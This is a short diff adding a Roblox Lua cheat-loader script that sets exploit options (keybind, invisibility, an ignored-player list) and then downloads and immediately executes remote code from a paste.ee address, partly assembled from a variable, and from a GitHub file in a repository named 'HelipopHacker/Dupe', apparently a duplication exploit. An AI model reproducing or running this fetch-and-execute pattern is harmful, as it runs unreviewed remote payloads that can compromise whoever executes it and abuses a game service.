@@ -1,0 +1,13 @@
+getgenv().bind = "F"
+getgenv().invis = false
+getgenv().on = true
+getgenv().IgnoredList = {
+    "Person1",
+    "Person2",
+    "Person3"
+}
+ 
+local domain = "paste.ee"
+loadstring(game:HttpGet("https://"..domain.."/r/WFYpr/0"))()
+wait()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HelipopHacker/Dupe/main/main.txt", true))()
